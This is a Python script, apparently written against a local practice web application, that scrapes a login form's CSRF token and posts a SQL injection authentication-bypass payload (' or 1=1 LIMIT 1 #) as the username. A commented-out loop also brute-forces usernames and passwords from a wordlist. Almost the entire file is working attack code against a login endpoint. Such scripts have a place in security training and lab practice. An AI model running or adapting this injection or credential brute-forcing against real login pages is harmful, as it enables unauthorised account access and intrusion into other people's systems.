import requests
import sys
from bs4 import BeautifulSoup

filename = "wordlist.txt"
words = []
login_url = "http://127.0.0.1/website/login.php"
auth_url = "http://127.0.0.1/website/auth.php"

def read_file():
    word_file = open(filename, 'r')

    for word in word_file:
        words.append(word.strip("\n"))

    word_file.close()

def main():
    read_file()

    session = requests.Session()

    try:
        response = session.get(login_url)
        status_code = response.status_code
        # print(status_code)
    except:
        print("URL not found")
        sys.exit(0)
    
    if status_code != 200:
        print("URL not found")
        sys.exit(0)

    # print(response.text)
    login_form = BeautifulSoup(response.content, 'html.parser')
    token = login_form.find("input", {"name":"token"})['value']
    action = login_form.find("input", {"name":"action"})['value']

    # for word_1 in words:
    #     for word_2 in words:
    #         payload = {
    #             "username":word_1,
    #             "password":word_2,
    #             "token":token,
    #             "action":action
    #         }

    #         response = session.post(auth_url, data=payload)

    #         if response.url != login_url:
    #             print(f"Valid username:{word_1} and password:{word_2}")
    #             sys.exit(0)
    #         else:
    #             print(f"Invalid username:{word_1} and password:{word_2}")

    payload = {
        "username":"' or 1=1 LIMIT 1 #",
        "password":"",
        "token":token,
        "action":action
    }

    response = session.post(auth_url, data=payload)

    if response.url != login_url:
        print("Success login")
    else:
        print("Fail login")


if __name__ == "__main__":
    main()